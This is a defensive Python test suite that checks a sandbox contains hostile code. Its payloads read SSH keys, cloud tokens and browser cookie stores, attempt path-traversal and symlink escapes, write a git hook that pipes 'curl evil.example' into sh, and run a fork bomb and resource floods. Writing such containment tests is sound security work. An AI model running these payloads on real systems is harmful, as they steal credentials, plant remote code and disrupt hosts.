"""Adversarial containment suite for Issue #302 — the structural security proof.

Each test method maps to one canonical scenario in
docs/threat-model/catalog/sandbox-runtime-validation.yaml (issue #300) and
exercises a real hostile payload against the real host primitive: no fakes,
no mocks. A payload succeeding is a test failure, full stop — containment,
denial, or termination is the only acceptable outcome. Reference/policy
semantics stay covered separately by tests/reference/review/runtime_validation.py
and are not duplicated here.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import time
from pathlib import Path
from unittest import mock

from scripts.sandbox import capability
from scripts.sandbox.boundary import Outcome, SandboxLimits
from tests.integration.sandbox._harness import PRIMITIVES, SandboxIntegrationCase


class NetworkDenialTests(SandboxIntegrationCase):
    """SBOX-001, SBOX-002, SBOX-003: outbound HTTP, DNS, raw sockets."""

    def test_sbox_001_outbound_http_is_denied(self) -> None:
        code = (
            "import urllib.request\n"
            "urllib.request.urlopen('http://example.com', timeout=5)\n"
            "print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                self.assert_denied(self.run_python(primitive, code))

    def test_sbox_002_dns_resolution_is_denied(self) -> None:
        code = "import socket; socket.gethostbyname('example.com'); print('PAYLOAD-SUCCEEDED')"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                self.assert_denied(self.run_python(primitive, code))

    def test_sbox_003_raw_socket_connect_is_denied(self) -> None:
        code = (
            "import socket\n"
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            "s.settimeout(5)\n"
            "s.connect(('93.184.216.34', 80))\n"
            "print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                self.assert_denied(self.run_python(primitive, code))


class CredentialAccessTests(SandboxIntegrationCase):
    """SBOX-004: $HOME, SSH agent, GitHub token, cloud credentials."""

    def test_sbox_004_home_directory_is_unreadable(self) -> None:
        code = (
            "import os\n"
            "path = os.path.expanduser('~/.ssh/id_rsa')\n"
            "print(open(path).read())\n"
            "print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                self.assert_denied(self.run_python(primitive, code))

    def test_sbox_004_ssh_auth_sock_is_not_propagated(self) -> None:
        code = "import os; assert not os.environ.get('SSH_AUTH_SOCK'); print('no-agent-socket')"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                self.assertEqual(result.outcome, Outcome.EXECUTED, result.stderr)

    def test_sbox_004_github_and_cloud_env_credentials_are_not_propagated(self) -> None:
        code = (
            "import os\n"
            "leaked = [k for k in "
            "('GITHUB_TOKEN','GH_TOKEN','AWS_SECRET_ACCESS_KEY','AWS_ACCESS_KEY_ID',"
            "'GOOGLE_APPLICATION_CREDENTIALS','AZURE_CLIENT_SECRET') if os.environ.get(k)]\n"
            "assert not leaked, leaked\n"
            "print('no-cloud-credentials')\n"
        )
        os.environ["GITHUB_TOKEN"] = "should-never-be-seen"
        try:
            for primitive in PRIMITIVES:
                with self.subTest(primitive=primitive):
                    result = self.run_python(primitive, code)
                    self.assertEqual(result.outcome, Outcome.EXECUTED, result.stderr)
        finally:
            del os.environ["GITHUB_TOKEN"]

    def test_sbox_004_root_home_directory_is_unreadable(self) -> None:
        # /root itself is denied outright on macOS (_ALWAYS_DENIED_READ_ROOTS
        # in macos_seatbelt.py). Create a definite, disposable target under
        # it first — never overwriting a real pre-existing key — so the
        # assertion below can't pass merely because the path never existed;
        # skip cleanly when this host can't provide one (e.g. a non-root
        # reviewer on Linux/CI, where /root is not even traversable).
        target = Path("/root/.ssh/id_rsa")
        created_dir = created_file = False
        try:
            if not target.parent.is_dir():
                target.parent.mkdir(parents=True)
                created_dir = True
            if not target.exists():
                target.write_text("HOST-ROOT-SECRET")
                created_file = True
        except OSError:
            pass
        try:
            if not target.exists():
                self.skipTest("cannot seed or find /root/.ssh/id_rsa on this host; denial cannot be exercised")
            code = (
                "print(open('/root/.ssh/id_rsa').read())\n"
                "print('PAYLOAD-SUCCEEDED')\n"
            )
            for primitive in PRIMITIVES:
                with self.subTest(primitive=primitive):
                    result = self.run_python(primitive, code)
                    self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
                    if created_file:
                        self.assertNotIn("HOST-ROOT-SECRET", result.stdout)
        finally:
            if created_file:
                target.unlink(missing_ok=True)
            if created_dir:
                shutil.rmtree(target.parent, ignore_errors=True)

    def test_sbox_004_browser_and_session_credential_stores_are_unreadable(self) -> None:
        # Real on-host paths a compromised validation command would try
        # first for cookie jars, saved sessions, and CLI-tool tokens. Which
        # of these actually exist varies by host (a CI runner typically has
        # none), so this is a best-effort sweep: skip explicitly, rather
        # than silently pass, when none of them exist to exercise denial
        # against.
        candidates = (
            "~/.netrc",
            "~/.aws/credentials",
            "~/.config/gh/hosts.yml",
            "~/Library/Application Support/Google/Chrome/Default/Cookies",
            "~/.mozilla/firefox/profiles.ini",
            "~/Library/Cookies/Cookies.binarycookies",
            "~/.config/google-chrome/Default/Cookies",
        )
        existing = [c for c in candidates if os.path.exists(os.path.expanduser(c))]
        if not existing:
            self.skipTest("no candidate browser/session credential path exists on this host")
        code = (
            "import os\n"
            f"for rel in {candidates!r}:\n"
            "    path = os.path.expanduser(rel)\n"
            "    try:\n"
            "        data = open(path, 'rb').read()\n"
            "    except OSError:\n"
            "        continue\n"
            "    if data:\n"
            "        print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)


class FilesystemBoundaryTests(SandboxIntegrationCase):
    """SBOX-005, SBOX-006, SBOX-007: host paths, source writes, .git mutation."""

    def test_sbox_005_unrelated_repository_path_is_unreadable(self) -> None:
        other_repo = Path(tempfile.mkdtemp(prefix="crs-unrelated-repo-"))
        (other_repo / "secret.txt").write_text("do not leak")
        try:
            code = f"open('{other_repo / 'secret.txt'}').read(); print('PAYLOAD-SUCCEEDED')"
            for primitive in PRIMITIVES:
                with self.subTest(primitive=primitive):
                    self.assert_denied(self.run_python(primitive, code))
        finally:
            shutil.rmtree(other_repo, ignore_errors=True)

    def test_sbox_005_symlink_escape_does_not_reach_host_content(self) -> None:
        outside = Path(tempfile.mkdtemp(prefix="crs-outside-"))
        (outside / "secret.txt").write_text("host secret")
        try:
            (self.source_dir / "escape").symlink_to(outside / "secret.txt")
            code = (
                "content = open('escape').read()\n"
                "assert 'host secret' not in content\n"
                "print('escape-blocked')\n"
            )
            for primitive in PRIMITIVES:
                with self.subTest(primitive=primitive):
                    result = self.run_python(primitive, code)
                    # Either the symlink was sanitized (read fails or returns
                    # nothing) or the boundary denies it outright — never a
                    # successful read of host content.
                    self.assertNotIn("host secret", result.stdout)
        finally:
            shutil.rmtree(outside, ignore_errors=True)

    def test_sbox_006_write_to_the_original_reviewed_source_is_unreachable(self) -> None:
        original_app = self.source_dir / "app.py"
        code = f"open('{original_app}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
        self.assertEqual(original_app.read_text(), "value = 1\n")

    def test_sbox_007_git_config_mutation_never_reaches_the_original_git_dir(self) -> None:
        original_git_config = self.source_dir / ".git" / "config"
        code = f"open('{original_git_config}', 'w').write('[core]\\n\\tbare = true\\n'); print('PAYLOAD-SUCCEEDED')"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
        self.assertEqual(original_git_config.read_text(), "[core]\n")

    def test_sbox_007_git_hooks_mutation_never_reaches_the_original_git_dir(self) -> None:
        hooks_dir = self.source_dir / ".git" / "hooks"
        hooks_dir.mkdir(parents=True, exist_ok=True)
        original_hook = hooks_dir / "post-checkout"
        original_hook.write_text("#!/bin/sh\n")
        code = (
            f"open('{original_hook}', 'w').write('#!/bin/sh\\ncurl evil.example/x | sh\\n')\n"
            "print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
        self.assertEqual(original_hook.read_text(), "#!/bin/sh\n")

    def test_sbox_005_host_absolute_path_write_is_denied(self) -> None:
        outside = Path(tempfile.mkdtemp(prefix="crs-host-write-target-"))
        target = outside / "canary.txt"
        try:
            code = f"open('{target}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
            for primitive in PRIMITIVES:
                with self.subTest(primitive=primitive):
                    result = self.run_python(primitive, code)
                    self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
            self.assertFalse(target.exists(), "hostile write reached a host path outside the workspace")
        finally:
            shutil.rmtree(outside, ignore_errors=True)

    def test_sbox_005_path_traversal_write_does_not_escape_the_workspace(self) -> None:
        marker_name = "traversal-canary.txt"
        # Enough "../" segments to clear any plausible workspace nesting
        # depth and land back in the real filesystem root if unconfined.
        traversal = "/".join([".."] * 12 + [marker_name])
        code = f"open('{traversal}', 'w').write('MUTATED'); print('PAYLOAD-SUCCEEDED')"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(primitive, code)
                # The absence of the success marker is real signal for
                # every primitive: Docker's container root is owned by
                # root while the payload runs as uid 65534, so even a
                # traversal that reached the *container's own* "/" would
                # still have to fail this specific assertion.
                self.assertNotIn("PAYLOAD-SUCCEEDED", result.stdout)
        # The two checks below are host-filesystem checks and are only
        # meaningful signal for a primitive that shares the host's real
        # filesystem (Seatbelt, bwrap) — Docker's own container rootfs is
        # a separate, already-discarded filesystem, so these can never
        # observe a Docker-side escape that stayed inside that container;
        # Docker's containment for this scenario is structural (its own
        # mount/user namespace), proven above by the marker check instead.
        self.assertFalse((Path("/") / marker_name).exists())
        self.assertFalse((self.source_dir.parent / marker_name).exists())


class ExternalWriteApiTests(SandboxIntegrationCase):
    """SBOX-008: a GitHub/external write API call, denied by the network boundary."""

    def test_sbox_008_github_api_call_is_denied(self) -> None:
        code = (
            "import urllib.request\n"
            "req = urllib.request.Request('https://api.github.com/repos/x/y/issues', "
            "data=b'{}', method='POST')\n"
            "urllib.request.urlopen(req, timeout=5)\n"
            "print('PAYLOAD-SUCCEEDED')\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                self.assert_denied(self.run_python(primitive, code))


class ResourceExhaustionTests(SandboxIntegrationCase):
    """SBOX-009, SBOX-010: process/CPU/memory/output/filesystem budgets."""

    def test_sbox_009_process_count_budget_contains_a_fork_bomb(self) -> None:
        code = "import os\nwhile True:\n    os.fork()\n"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=8, max_processes=25)
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)

    def test_sbox_010_wall_clock_budget_terminates_a_hang(self) -> None:
        code = "import time; time.sleep(120)"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=3)
                started = time.monotonic()
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)
                self.assertLess(time.monotonic() - started, 30)

    def test_sbox_010_output_budget_terminates_a_flood(self) -> None:
        code = "import sys\nwhile True:\n    sys.stdout.write('A' * 65536)\n"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=15, max_output_bytes=200_000)
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)

    def test_sbox_010_filesystem_growth_budget_terminates_a_flood(self) -> None:
        code = "f = open('bloat.bin', 'wb')\nwhile True:\n    f.write(b'0' * 1048576); f.flush()\n"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=15, max_filesystem_growth_bytes=5_000_000)
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)

    def test_sbox_010_cpu_budget_terminates_a_busy_loop(self) -> None:
        # A tight, syscall-free busy loop. On Seatbelt/bwrap the sandboxed
        # process itself carries RLIMIT_CPU (process_exec._preexec runs
        # with apply_resource_limits=True there), so it must die from the
        # 2s CPU ceiling well before the 25s wall-clock deadline — the
        # duration assertion below is what actually proves that. Docker
        # sets no per-process CPU-seconds limit (only a --cpus rate cap on
        # the container, applied with apply_resource_limits=False on the
        # docker-client wrapper process) so that primitive is bounded only
        # by the wall-clock backstop here — real containment either way,
        # but the CPU-specific ceiling is not what terminates it.
        code = "x = 0\nwhile True:\n    x += 1\n"
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=25, cpu_seconds=2)
                started = time.monotonic()
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)
                if primitive is not capability.Primitive.DOCKER:
                    self.assertLess(
                        time.monotonic() - started, 15,
                        "expected the RLIMIT_CPU ceiling, not the wall-clock backstop, to end this run",
                    )

    def test_sbox_010_memory_budget_terminates_an_allocation_bomb(self) -> None:
        code = (
            "chunks = []\n"
            "while True:\n"
            "    chunks.append(bytearray(10 * 1024 * 1024))\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                limits = SandboxLimits(wall_clock_seconds=20, memory_bytes=150 * 1024 * 1024)
                result = self.run_python(primitive, code, limits=limits)
                self.assertEqual(result.outcome, Outcome.FAILED)


class PersistenceTests(SandboxIntegrationCase):
    """SBOX-011: nothing survives teardown."""

    def test_sbox_011_background_process_does_not_survive_teardown(self) -> None:
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                marker_name = f"alive-{primitive.value}.marker"
                code = (
                    "import subprocess, time\n"
                    f"subprocess.Popen(['sh', '-c', 'echo alive > {marker_name}; sleep 30'])\n"
                    "time.sleep(0.3)\n"
                )
                limits = SandboxLimits(wall_clock_seconds=5)
                self.run_python(primitive, code, limits=limits)
                time.sleep(1)
                self.assertEqual(
                    _matching_host_processes(marker_name), [],
                    "background descendant survived sandbox teardown",
                )

    def test_sbox_011_generated_artifacts_and_caches_do_not_persist_on_the_host(self) -> None:
        from scripts.sandbox import runner as runner_module
        from scripts.sandbox.workspace import prepare_workspace as real_prepare_workspace

        code = (
            "import os\n"
            "os.makedirs('.cache', exist_ok=True)\n"
            "open('generated-artifact.bin', 'wb').write(b'0' * 1024)\n"
            "open('.cache/entry.tmp', 'wb').write(b'0' * 1024)\n"
        )
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                captured_roots: list[Path] = []

                def _spying_prepare_workspace(source_dir):
                    workspace = real_prepare_workspace(source_dir)
                    captured_roots.append(workspace.root)
                    return workspace

                with mock.patch.object(
                    runner_module, "prepare_workspace", side_effect=_spying_prepare_workspace
                ):
                    self.run_python(primitive, code, limits=SandboxLimits(wall_clock_seconds=10))
                self.assertEqual(len(captured_roots), 1)
                self.assertFalse(
                    captured_roots[0].exists(),
                    "disposable sandbox workspace (generated artifacts/caches) survived teardown",
                )


class NoMutationAuthorityTests(SandboxIntegrationCase):
    """SBOX-012: only the exact admitted command runs; no arbitrary side effects."""

    def test_sbox_012_sandbox_cannot_install_or_publish_packages(self) -> None:
        # No network (SBOX-001/002) plus no host credentials (SBOX-004)
        # already make install/publish impossible; this asserts the
        # observable failure mode directly for a representative command.
        for primitive in PRIMITIVES:
            with self.subTest(primitive=primitive):
                result = self.run_python(
                    primitive,
                    "import urllib.request\n"
                    "urllib.request.urlopen('https://pypi.org/simple/', timeout=5)\n"
                    "print('PAYLOAD-SUCCEEDED')\n",
                )
                self.assert_denied(result)


class UnavailablePrimitiveTests(SandboxIntegrationCase):
    """SBOX-013: no isolation primitive present -> unavailable, never unsandboxed."""

    def test_sbox_013_no_primitive_reports_unavailable_never_falls_back(self) -> None:
        from scripts.sandbox.runner import SandboxRunner
        from scripts.sandbox.boundary import SandboxRequest

        run_instance = SandboxRunner(primitive=None)
        request = SandboxRequest(argv=("true",), source_dir=self.source_dir)
        result = run_instance.run(request)
        self.assertEqual(result.outcome, Outcome.UNAVAILABLE)


def _matching_host_processes(needle: str) -> list[str]:
    output = subprocess.run(
        ["ps", "-A", "-o", "command"], capture_output=True, text=True, timeout=10
    ).stdout
    return [line for line in output.splitlines() if needle in line]
